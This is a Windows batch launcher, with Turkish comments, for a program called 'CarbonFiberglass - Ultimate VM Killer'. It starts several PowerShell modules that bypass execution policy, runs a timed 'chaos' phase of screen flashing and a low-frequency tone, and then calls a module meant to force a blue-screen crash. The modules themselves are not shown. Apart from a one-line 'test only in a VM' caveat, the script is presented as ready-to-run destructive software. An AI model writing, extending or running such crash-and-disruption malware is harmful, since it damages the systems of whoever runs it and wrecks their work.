@echo off
title CarbonFiberglass - Ultimate VM Killer
color 0c
cls

echo ============================================================
echo   ☢️  CARBONFIBERGLASS ACTIVATED  ☢️
echo ============================================================
echo   Gorsel solen + Muzik (50-100 Hz ses sabit)
echo   Hata yonetimi + Log + Kendi kendini tamir
echo   Sadece VM icinde test edin!
echo ============================================================
echo.
echo   Press any key to start chaos...
pause >nul

:: KENDİ KENDİNİ TAMİR (önce çalışsın)
start /b powershell -ExecutionPolicy Bypass -File modul_kendi_kendini_tamir.ps1

:: LOG SİSTEMİ
start /b powershell -ExecutionPolicy Bypass -File modul_log.ps1

:: CİDDİ HATA (çökme durumunda)
start /b powershell -ExecutionPolicy Bypass -File modul_ciddi_hata.ps1

:: HATA YÖNETİMİ (tüm modülleri başlatır ve izler)
start /b powershell -ExecutionPolicy Bypass -File modul_hata_yonetimi.ps1

:: SÜRE (8-10 DAKİKA)
set /a SURE=%random% %% 120 + 480
echo ============================================================
echo   ☢️ CHAOS ACTIVATED ☢️
echo   Duration: %SURE% seconds
echo   Log: C:\CarbonFiberglass_Log.txt
echo ============================================================
timeout /t %SURE% /nobreak >nul

:: BSOD TETİKLE
start /b powershell -ExecutionPolicy Bypass -File modul_bsod.ps1

:: BİTİŞ
cls
echo ============================================================
echo   ☢️ VM KILLED ☢️
echo   Log: C:\CarbonFiberglass_Log.txt
echo   Tamir logu: C:\CarbonFiberglass_TamirLog.txt
echo ============================================================
pause >nul